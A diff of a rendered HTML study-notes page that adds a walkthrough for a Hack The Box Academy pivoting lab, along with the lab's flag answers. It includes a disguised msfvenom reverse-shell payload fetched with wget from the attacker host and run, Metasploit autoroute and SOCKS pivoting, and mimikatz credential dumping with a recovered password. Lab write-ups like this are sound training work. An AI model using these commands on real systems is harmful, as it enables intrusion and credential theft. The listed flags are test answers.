@@ -21236,21 +21236,97 @@ You have successfully captured credentials to an external facing Web Server. Con
 </span></code></pre></div>
 <p>Results: 172.16.5.35</p>
 <p><strong>Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-190-1"><a id="__codelineno-190-1" name="__codelineno-190-1" href="#__codelineno-190-1"></a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-190-1"><a id="__codelineno-190-1" name="__codelineno-190-1" href="#__codelineno-190-1"></a>###########
+</span><span id="__span-190-2"><a id="__codelineno-190-2" name="__codelineno-190-2" href="#__codelineno-190-2"></a># I will use Module `Autoroute` in metasploit:
+</span><span id="__span-190-3"><a id="__codelineno-190-3" name="__codelineno-190-3" href="#__codelineno-190-3"></a>############
+</span><span id="__span-190-4"><a id="__codelineno-190-4" name="__codelineno-190-4" href="#__codelineno-190-4"></a>
+</span><span id="__span-190-5"><a id="__codelineno-190-5" name="__codelineno-190-5" href="#__codelineno-190-5"></a># Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.
+</span><span id="__span-190-6"><a id="__codelineno-190-6" name="__codelineno-190-6" href="#__codelineno-190-6"></a># 1. Create a payload for the Ubuntu Pivot Host (our victim&#39;s machine 1):
+</span><span id="__span-190-7"><a id="__codelineno-190-7" name="__codelineno-190-7" href="#__codelineno-190-7"></a>
+</span><span id="__span-190-8"><a id="__codelineno-190-8" name="__codelineno-190-8" href="#__codelineno-190-8"></a>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipKali -f elf -o backupjob LPORT=8080
+</span><span id="__span-190-9"><a id="__codelineno-190-9" name="__codelineno-190-9" href="#__codelineno-190-9"></a>
+</span><span id="__span-190-10"><a id="__codelineno-190-10" name="__codelineno-190-10" href="#__codelineno-190-10"></a># 2. Kali machine. Different terminal. Start a multi/handler, also known as a Generic Payload Handler.
+</span><span id="__span-190-11"><a id="__codelineno-190-11" name="__codelineno-190-11" href="#__codelineno-190-11"></a>msfconsole -q
+</span><span id="__span-190-12"><a id="__codelineno-190-12" name="__codelineno-190-12" href="#__codelineno-190-12"></a>use exploit/multi/handler
+</span><span id="__span-190-13"><a id="__codelineno-190-13" name="__codelineno-190-13" href="#__codelineno-190-13"></a>set lhost 0.0.0.0
+</span><span id="__span-190-14"><a id="__codelineno-190-14" name="__codelineno-190-14" href="#__codelineno-190-14"></a>set lport 8080
+</span><span id="__span-190-15"><a id="__codelineno-190-15" name="__codelineno-190-15" href="#__codelineno-190-15"></a>set payload linux/x64/meterpreter/reverse_tcp
+</span><span id="__span-190-16"><a id="__codelineno-190-16" name="__codelineno-190-16" href="#__codelineno-190-16"></a>run
+</span><span id="__span-190-17"><a id="__codelineno-190-17" name="__codelineno-190-17" href="#__codelineno-190-17"></a>
+</span><span id="__span-190-18"><a id="__codelineno-190-18" name="__codelineno-190-18" href="#__codelineno-190-18"></a># 3. Once created, kali machine, serve it with a python http server
+</span><span id="__span-190-19"><a id="__codelineno-190-19" name="__codelineno-190-19" href="#__codelineno-190-19"></a>python3 -m http.server 8001
+</span><span id="__span-190-20"><a id="__codelineno-190-20" name="__codelineno-190-20" href="#__codelineno-190-20"></a>
+</span><span id="__span-190-21"><a id="__codelineno-190-21" name="__codelineno-190-21" href="#__codelineno-190-21"></a># 4. Connect to the Ubuntu with the id_rsa and download the file
+</span><span id="__span-190-22"><a id="__codelineno-190-22" name="__codelineno-190-22" href="#__codelineno-190-22"></a>ssh -i id_rsa webadmin@ipUbuntu
+</span><span id="__span-190-23"><a id="__codelineno-190-23" name="__codelineno-190-23" href="#__codelineno-190-23"></a>wget http://$ipKali:8001/backupjob
+</span><span id="__span-190-24"><a id="__codelineno-190-24" name="__codelineno-190-24" href="#__codelineno-190-24"></a>chmod +x backupjob
+</span><span id="__span-190-25"><a id="__codelineno-190-25" name="__codelineno-190-25" href="#__codelineno-190-25"></a>
+</span><span id="__span-190-26"><a id="__codelineno-190-26" name="__codelineno-190-26" href="#__codelineno-190-26"></a># 5. Ubuntu machine, execute the file to gain a Meterpreter session in your kali
+</span><span id="__span-190-27"><a id="__codelineno-190-27" name="__codelineno-190-27" href="#__codelineno-190-27"></a>./backupjob
+</span><span id="__span-190-28"><a id="__codelineno-190-28" name="__codelineno-190-28" href="#__codelineno-190-28"></a>
+</span><span id="__span-190-29"><a id="__codelineno-190-29" name="__codelineno-190-29" href="#__codelineno-190-29"></a># 6. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit&#39;s post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
+</span><span id="__span-190-30"><a id="__codelineno-190-30" name="__codelineno-190-30" href="#__codelineno-190-30"></a>use auxiliary/server/socks_proxy
+</span><span id="__span-190-31"><a id="__codelineno-190-31" name="__codelineno-190-31" href="#__codelineno-190-31"></a>set SRVPORT 9050
+</span><span id="__span-190-32"><a id="__codelineno-190-32" name="__codelineno-190-32" href="#__codelineno-190-32"></a>set SRVHOST 
+</span><span id="__span-190-33"><a id="__codelineno-190-33" name="__codelineno-190-33" href="#__codelineno-190-33"></a>set version 4a
+</span><span id="__span-190-34"><a id="__codelineno-190-34" name="__codelineno-190-34" href="#__codelineno-190-34"></a>run
+</span><span id="__span-190-35"><a id="__codelineno-190-35" name="__codelineno-190-35" href="#__codelineno-190-35"></a># This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
+</span><span id="__span-190-36"><a id="__codelineno-190-36" name="__codelineno-190-36" href="#__codelineno-190-36"></a># Even though the command line has not returned anything you can ask for the jobs in execution with:
+</span><span id="__span-190-37"><a id="__codelineno-190-37" name="__codelineno-190-37" href="#__codelineno-190-37"></a>jobs
+</span><span id="__span-190-38"><a id="__codelineno-190-38" name="__codelineno-190-38" href="#__codelineno-190-38"></a>
+</span><span id="__span-190-39"><a id="__codelineno-190-39" name="__codelineno-190-39" href="#__codelineno-190-39"></a># Make sure that your /etc/proxychains4.conf in your kali has enabled the line
+</span><span id="__span-190-40"><a id="__codelineno-190-40" name="__codelineno-190-40" href="#__codelineno-190-40"></a>socks4 127.0.0.1 9050
+</span><span id="__span-190-41"><a id="__codelineno-190-41" name="__codelineno-190-41" href="#__codelineno-190-41"></a># Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
+</span><span id="__span-190-42"><a id="__codelineno-190-42" name="__codelineno-190-42" href="#__codelineno-190-42"></a>
+</span><span id="__span-190-43"><a id="__codelineno-190-43" name="__codelineno-190-43" href="#__codelineno-190-43"></a># 7. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
+</span><span id="__span-190-44"><a id="__codelineno-190-44" name="__codelineno-190-44" href="#__codelineno-190-44"></a>use post/multi/manage/autoroute
+</span><span id="__span-190-45"><a id="__codelineno-190-45" name="__codelineno-190-45" href="#__codelineno-190-45"></a>set SESSION 1
+</span><span id="__span-190-46"><a id="__codelineno-190-46" name="__codelineno-190-46" href="#__codelineno-190-46"></a>set SUBNET $NewSubnet
+</span><span id="__span-190-47"><a id="__codelineno-190-47" name="__codelineno-190-47" href="#__codelineno-190-47"></a># Example: set SUBNET 172.16.5.0
+</span><span id="__span-190-48"><a id="__codelineno-190-48" name="__codelineno-190-48" href="#__codelineno-190-48"></a>run
+</span><span id="__span-190-49"><a id="__codelineno-190-49" name="__codelineno-190-49" href="#__codelineno-190-49"></a># This will bind session 1 to the $NewSubnet discovered in the victim&#39;s machine 1, doing the pivoting
+</span><span id="__span-190-50"><a id="__codelineno-190-50" name="__codelineno-190-50" href="#__codelineno-190-50"></a>
+</span><span id="__span-190-51"><a id="__codelineno-190-51" name="__codelineno-190-51" href="#__codelineno-190-51"></a># It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):
+</span><span id="__span-190-52"><a id="__codelineno-190-52" name="__codelineno-190-52" href="#__codelineno-190-52"></a>sessions -i 1
+</span><span id="__span-190-53"><a id="__codelineno-190-53" name="__codelineno-190-53" href="#__codelineno-190-53"></a>run autoroute -s $NewDiscoveredIp/16
+</span><span id="__span-190-54"><a id="__codelineno-190-54" name="__codelineno-190-54" href="#__codelineno-190-54"></a>
+</span><span id="__span-190-55"><a id="__codelineno-190-55" name="__codelineno-190-55" href="#__codelineno-190-55"></a># List the active routes:
+</span><span id="__span-190-56"><a id="__codelineno-190-56" name="__codelineno-190-56" href="#__codelineno-190-56"></a>run autoroute -p
+</span><span id="__span-190-57"><a id="__codelineno-190-57" name="__codelineno-190-57" href="#__codelineno-190-57"></a>
+</span><span id="__span-190-58"><a id="__codelineno-190-58" name="__codelineno-190-58" href="#__codelineno-190-58"></a># 8. Make sure that you will get back the communications with a reverse proxy:
+</span><span id="__span-190-59"><a id="__codelineno-190-59" name="__codelineno-190-59" href="#__codelineno-190-59"></a>
+</span><span id="__span-190-60"><a id="__codelineno-190-60" name="__codelineno-190-60" href="#__codelineno-190-60"></a>ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ipUbuntuCompromisedmachine:8080:0.0.0.0:8000
+</span><span id="__span-190-61"><a id="__codelineno-190-61" name="__codelineno-190-61" href="#__codelineno-190-61"></a>
+</span><span id="__span-190-62"><a id="__codelineno-190-62" name="__codelineno-190-62" href="#__codelineno-190-62"></a># 9. Finally, use proxychains to route our RDP session traffic via our Meterpreter session.
+</span><span id="__span-190-63"><a id="__codelineno-190-63" name="__codelineno-190-63" href="#__codelineno-190-63"></a>proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:&quot;Plain Human work\!&quot;
 </span></code></pre></div>
-<p>Results: </p>
+<p>Results: S1ngl3-Piv07-3@sy-Day</p>
 <p><strong>In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-191-1"><a id="__codelineno-191-1" name="__codelineno-191-1" href="#__codelineno-191-1"></a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-191-1"><a id="__codelineno-191-1" name="__codelineno-191-1" href="#__codelineno-191-1"></a># 1. Copy mimikatz to the Windows machine 1 with CTLR-C CTRL-V. Then in the Powershell terminal
+</span><span id="__span-191-2"><a id="__codelineno-191-2" name="__codelineno-191-2" href="#__codelineno-191-2"></a>.\mimikatz.exe privilege::debug  sekurlsa::logonpasswords     
+</span><span id="__span-191-3"><a id="__codelineno-191-3" name="__codelineno-191-3" href="#__codelineno-191-3"></a>
+</span><span id="__span-191-4"><a id="__codelineno-191-4" name="__codelineno-191-4" href="#__codelineno-191-4"></a># You will see user vfrank and password
+</span><span id="__span-191-5"><a id="__codelineno-191-5" name="__codelineno-191-5" href="#__codelineno-191-5"></a>vfrank:Imply wet Unmasked!
 </span></code></pre></div>
-<p>Results: </p>
+<p>Results: vfrank</p>
 <p><strong>For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-192-1"><a id="__codelineno-192-1" name="__codelineno-192-1" href="#__codelineno-192-1"></a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-192-1"><a id="__codelineno-192-1" name="__codelineno-192-1" href="#__codelineno-192-1"></a># 1. Open CMD and enumerate network interfaces
+</span><span id="__span-192-2"><a id="__codelineno-192-2" name="__codelineno-192-2" href="#__codelineno-192-2"></a>ipconfig /all
+</span><span id="__span-192-3"><a id="__codelineno-192-3" name="__codelineno-192-3" href="#__codelineno-192-3"></a>
+</span><span id="__span-192-4"><a id="__codelineno-192-4" name="__codelineno-192-4" href="#__codelineno-192-4"></a># 2. Notice a new network range: 172.16.6.35. Enumerate new Ips in that new network range
+</span><span id="__span-192-5"><a id="__codelineno-192-5" name="__codelineno-192-5" href="#__codelineno-192-5"></a>for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find &quot;Reply&quot;
+</span><span id="__span-192-6"><a id="__codelineno-192-6" name="__codelineno-192-6" href="#__codelineno-192-6"></a># As a result now we have 172.16.6.25
+</span><span id="__span-192-7"><a id="__codelineno-192-7" name="__codelineno-192-7" href="#__codelineno-192-7"></a>
+</span><span id="__span-192-8"><a id="__codelineno-192-8" name="__codelineno-192-8" href="#__codelineno-192-8"></a># Note: I had problems with the Poweshell enumerator. For some reason this did not work for me:
+</span><span id="__span-192-9"><a id="__codelineno-192-9" name="__codelineno-192-9" href="#__codelineno-192-9"></a>1..254 | % {&quot;172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)&quot;}
+</span><span id="__span-192-10"><a id="__codelineno-192-10" name="__codelineno-192-10" href="#__codelineno-192-10"></a>
+</span><span id="__span-192-11"><a id="__codelineno-192-11" name="__codelineno-192-11" href="#__codelineno-192-11"></a># 3. Windows-R and mstsc.exe. Enter 172.16.6.25 and use the creds vfrank:Imply wet Unmasked!
 </span></code></pre></div>
-<p>Results: </p>
+<p>Results: N3tw0rk-H0pp1ng-f0R-FuN</p>
 <p><strong>Submit the contents of C:\Flag.txt located on the Domain Controller.</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-193-1"><a id="__codelineno-193-1" name="__codelineno-193-1" href="#__codelineno-193-1"></a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-193-1"><a id="__codelineno-193-1" name="__codelineno-193-1" href="#__codelineno-193-1"></a># 1. In the previously open session, open a windows explorer and notice the shared unit Z:\
 </span></code></pre></div>
-<p>Results: </p>
+<p>Results: 3nd-0xf-Th3-R@inbow!</p>
 <h2 id="active-directory-enumeration-attacks"><a href="https://academy.hackthebox.com/module/details/143">Active Directory Enumeration &amp; Attacks</a></h2>
 <h2 id="using-web-proxies"><a href="https://academy.hackthebox.com/module/details/110">Using Web Proxies</a></h2>
 <h3 id="intercepting-web-requests">Intercepting Web Requests</h3>
@@ -21788,7 +21864,7 @@ You have successfully captured credentials to an external facing Web Server. Con
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-11-08T23:55:46+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-11-08</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-11-09T21:58:30+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-11-09</span></small></br>
 
 
     <small>Created: May 31, 2024 18:03:27</small>
